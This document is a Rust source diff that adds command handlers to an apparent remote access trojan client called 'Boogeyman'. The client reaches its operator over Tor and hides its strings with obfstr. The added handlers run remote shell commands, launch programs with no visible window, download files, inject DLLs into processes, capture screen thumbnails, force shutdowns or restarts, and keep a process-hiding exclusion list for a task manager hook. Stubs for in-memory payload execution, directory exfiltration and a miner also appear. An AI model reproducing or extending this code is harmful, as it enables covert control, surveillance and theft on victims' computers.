@@ -1,49 +1,345 @@
+use std::{
+    fs::create_dir_all,
+    io::{ Read, Write },
+    os::windows::process::CommandExt,
+    path::PathBuf,
+    process::Command,
+    sync::{ Arc, Mutex, RwLock },
+};
+
 use anyhow::{ Context, Result };
 use client_vars::{
-    constants::{ client_tag, client_version },
+    constants::{
+        client_tag,
+        client_version,
+        default_query_hook_exclusions,
+        query_hook_exclusions_file_path,
+    },
     types::{
-        receive::{ self, BoogeymanReceivePayload },
-        send::{ BoogeymanSendPayload, ServerAction, ServerParams },
+        receive::{ self, BoogeymanReceivePayload, ClientParams },
+        send::{ self, BoogeymanSendPayload, InitParams, ServerAction, ServerParams },
         structs::BotState,
     },
 };
-use shared::network::tor::{ LoggerConfig, ServerReceiveType, TorHandler };
+use shared::{
+    network::tor::{ LoggerConfig, ServerReceiveType, TorHandler },
+    utils::functions::{ restart_pc_instant, shutdown_pc_instant, write_file_to_random_folder },
+};
 use obfstr::obfstr as s;
-use crate::utils::system_info::generate_bot_state;
+use crate::{
+    tasks::task_manager_hook::inject_dll,
+    utils::{
+        system_info::{ generate_bot_state, get_dynamic_info, get_thumbnail },
+        terminal::Terminal,
+    },
+};
 
+use super::basic::download_file_to_path;
+
+#[derive(Clone)]
 pub struct BotHandler {
     tor_handler: TorHandler,
-    bot_state: BotState,
+    bot_state: Arc<RwLock<BotState>>,
+    terminal: Option<Arc<Mutex<Terminal>>>,
 }
 
 impl BotHandler {
     pub async fn new(logger_config: LoggerConfig) -> Result<Self> {
         let tor_handler = TorHandler::new(logger_config).await?;
         let bot_state = generate_bot_state(client_tag()).await;
-        Ok(BotHandler { tor_handler, bot_state })
+        Ok(BotHandler {
+            tor_handler,
+            bot_state: Arc::new(RwLock::new(bot_state)),
+            terminal: match Terminal::new() {
+                Ok(terminal) => { Some(Arc::new(Mutex::new(terminal))) }
+                Err(_error) => {
+                    // err!("error getting terminal: ", error);
+                    None
+                }
+            },
+        })
     }
 
     pub async fn run_handler(&mut self) {
-        self.tor_handler.run(|handler, data| { Self::process_data(handler.clone(), data) }).await;
+        let self_clone = Arc::new(RwLock::new(self.clone()));
+        let self_clone2 = self_clone.clone();
+
+        self.tor_handler.run(
+            move || {
+                Self::connect_callback_init(self_clone.clone());
+            },
+            move |handler, data| { Self::process_data(handler.clone(), data, self_clone2.clone()) }
+        ).await;
+    }
+    pub fn connect_callback_init(self_ref: Arc<RwLock<Self>>) {
+        let self_guard = self_ref.read().unwrap();
+        let params = InitParams { bot_state: self_guard.bot_state.read().unwrap().clone() };
+        if
+            let Err(_error) = Self::send_data(
+                &self_guard.tor_handler,
+                ServerAction::Init,
+                ServerParams::Init(params)
+            )
+        {
+            // err
+        }
     }
 
-    fn process_data(tor_handler: TorHandler, binary_data: Vec<u8>) -> Result<()> {
+    fn process_data(
+        tor_handler: TorHandler,
+        binary_data: Vec<u8>,
+        self_ref: Arc<RwLock<Self>>
+    ) -> Result<()> {
         let processed_data: BoogeymanReceivePayload = serde_json
             ::from_slice(&binary_data)
             .context(s!("Failed to parse binary data as LoaderReceivePayload").to_string())?;
 
-        Self::route_data(tor_handler, processed_data)
+        Self::route_data(tor_handler, processed_data, self_ref)
     }
 
-    fn route_data(tor_handler: TorHandler, processed_data: BoogeymanReceivePayload) -> Result<()> {
+    fn route_data(
+        tor_handler: TorHandler,
+        processed_data: BoogeymanReceivePayload,
+        self_ref: Arc<RwLock<Self>>
+    ) -> Result<()> {
         match processed_data.action {
             receive::ClientAction::UninstallSelf => {}
             receive::ClientAction::UpdateSelf => {}
+            receive::ClientAction::CallTerminalCommand => {
+                if let ClientParams::CallTerminalCommand(params) = processed_data.params {
+                    if let Some(terminal_ref) = &self_ref.read().unwrap().terminal {
+                        let mut terminal = terminal_ref.lock().unwrap();
+
+                        let data = match terminal.execute(&params.command) {
+                            Ok(data) =>
+                                send::TerminalOutputParams { output: Some(data), error: None },
+                            Err(error) =>
+                                send::TerminalOutputParams {
+                                    output: None,
+                                    error: Some(format!("{:#?}", error)),
+                                },
+                        };
+                        drop(terminal);
+                        Self::send_data(
+                            &tor_handler,
+                            ServerAction::TerminalOutput,
+                            ServerParams::TerminalOutput(data)
+                        )?;
+                    } else {
+                        return Err(anyhow::anyhow!(s!("Terminal not initialized").to_string()));
+                    }
+                } else {
+                    return Err(
+                        anyhow::anyhow!(
+                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
+                        )
+                    );
+                }
+            }
+            receive::ClientAction::DownloadAndExecFileInMemory => {}
+            receive::ClientAction::FetchLogs => {}
+            receive::ClientAction::CompressDirAndSend => {}
+            receive::ClientAction::CallSysEvent => {
+                if let ClientParams::CallSysEvent(params) = processed_data.params {
+                    match params.event {
+                        receive::SysEvent::Shutdown => {
+                            shutdown_pc_instant()?;
+                        }
+                        receive::SysEvent::Restart => {
+                            restart_pc_instant()?;
+                        }
+                    }
+                } else {
+                    return Err(
+                        anyhow::anyhow!(
+                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
+                        )
+                    );
+                }
+            }
+            receive::ClientAction::FetchDynamicData => {
+                if let ClientParams::FetchDynamicData(_params) = processed_data.params {
+                    let data = send::UpdateDynamicDataParams { dynamic_info: get_dynamic_info() };
+
+                    Self::send_data(
+                        &tor_handler,
+                        ServerAction::UpdateDynamicData,
+                        ServerParams::UpdateDynamicData(data)
+                    )?;
+                } else {
+                    return Err(
+                        anyhow::anyhow!(
+                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
+                        )
+                    );
+                }
+            }
+            receive::ClientAction::FetchThumbnail => {
+                if let ClientParams::FetchThumbnail(_params) = processed_data.params {
+                    let data = send::UpdateThumbnailParams { thumbnail: get_thumbnail()? };
+
+                    Self::send_data(
+                        &tor_handler,
+                        ServerAction::UpdateThumbnail,
+                        ServerParams::UpdateThumbnail(data)
+                    )?;
+                } else {
+                    return Err(
+                        anyhow::anyhow!(
+                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
+                        )
+                    );
+                }
+            }
+            receive::ClientAction::UpdateTaskManagerExclusions => {
+                if let ClientParams::UpdateTaskManagerExclusions(params) = processed_data.params {
+                    let file_path = query_hook_exclusions_file_path();
+                    std::fs::create_dir_all(&file_path.parent().unwrap())?;
+
+                    let mut process_names: Vec<String> = if
+                        file_path.exists() &&
+                        file_path.is_file()
+                    {
+                        // load existing
+                        let mut current_content = String::new();
+
+                        let mut file = std::fs::File::open(&file_path)?;
+                        file.read_to_string(&mut current_content)?;
+                        current_content
+                            .split(';')
+                            .map(|exclusion| exclusion.to_string())
+                            .collect()
+                    } else {
+                        std::fs::File::create(&file_path)?;
+                        default_query_hook_exclusions()
+                    };
+
+                    if let Some(override_full) = params.override_full {
+                        process_names = override_full;
+                    } else {
+                        for include in &params.include {
+                            if !process_names.contains(include) {
+                                process_names.push(include.clone());
+                            }
+                        }
+
+                        for exclude in &params.exclude {
+                            if
+                                let Some(index) = process_names
+                                    .iter()
+                                    .position(|line| line == exclude)
+                            {
+                                process_names.remove(index);
+                            }
+                        }
+                    }
+                    let updated_content = process_names.join(";");
+
+                    let mut file = std::fs::OpenOptions
+                        ::new()
+                        .write(true)
+                        .truncate(true)
+                        .open(&file_path)?;
+
+                    file.write_all(updated_content.as_bytes())?;
+                } else {
+                    return Err(
+                        anyhow::anyhow!(
+                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
+                        )
+                    );
+                }
+            }
+            receive::ClientAction::ExecLocalFile => {
+                if let ClientParams::ExecLocalFile(params) = processed_data.params {
+                    let mut program = Command::new(params.abs_path);
+                    if params.hidden {
+                        program.creation_flags(0x08000000); // CREATE_NO_WINDOW flag
+                    }
+                    if let Some(args) = params.args {
+                        program.raw_arg(format!(" {}", args));
+                    }
+                    if params.wait_for_output {
+                        let output = program
+                            .output()
+                            .context(s!("Failed to get output from ExecFile").to_string())?;
+
+                        let data = send::ExecFileOutputParams {
+                            status: output.status.code(),
+                            stdout: output.stdout,
+                            stderr: output.stderr,
+                        };
+
+                        Self::send_data(
+                            &tor_handler,
+                            ServerAction::ExecFileOutput,
+                            ServerParams::ExecFileOutput(data)
+                        )?;
+                    } else {
+                        program.spawn().context(s!("Failed to ExecFile").to_string())?;
+                    }
+                } else {
+                    return Err(
+                        anyhow::anyhow!(
+                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
+                        )
+                    );
+                }
+            }
+            receive::ClientAction::UpdateMinerConfig => {}
+            receive::ClientAction::DownloadFile => {
+                if let ClientParams::DownloadFile(params) = processed_data.params {
+                    let path = PathBuf::from(params.abs_path);
+                    if let Some(bytes) = params.from_bytes {
+                        std::fs::write(path, bytes)?;
+                    } else if let Some(url) = params.from_url {
+                        futures::executor::block_on(async {
+                            let _ = download_file_to_path(&url, path).await;
+                            // handle error
+                        });
+                    }
+
+                    // send output if fail
+                    // let data = send::UpdateThumbnailParams { thumbnail: get_thumbnail()? };
+
+                    // Self::send_data(
+                    //     tor_handler,
+                    //     ServerAction::UpdateThumbnail,
+                    //     ServerParams::UpdateThumbnail(data)
+                    // )?;
+                } else {
+                    return Err(
+                        anyhow::anyhow!(
+                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
+                        )
+                    );
+                }
+            }
+            receive::ClientAction::InjectDll => {
+                if let ClientParams::InjectDll(params) = processed_data.params {
+                    let dll_path = write_file_to_random_folder(s!("data.dll"), &params.dll_bytes)?;
+                    inject_dll(params.pid, dll_path.to_str().unwrap())?;
+                    // send output if fail
+                    // let data = send::UpdateThumbnailParams { thumbnail: get_thumbnail()? };
+
+                    // Self::send_data(
+                    //     tor_handler,
+                    //     ServerAction::UpdateThumbnail,
+                    //     ServerParams::UpdateThumbnail(data)
+                    // )?;
+                } else {
+                    return Err(
+                        anyhow::anyhow!(
+                            format!("{}{:#?}", s!("Invalid params for: "), processed_data.action)
+                        )
+                    );
+                }
+            }
         }
         Ok(())
     }
     fn send_data(
-        tor_handler: &mut TorHandler,
+        tor_handler: &TorHandler,
         action: ServerAction,
         params: ServerParams
     ) -> Result<()> {
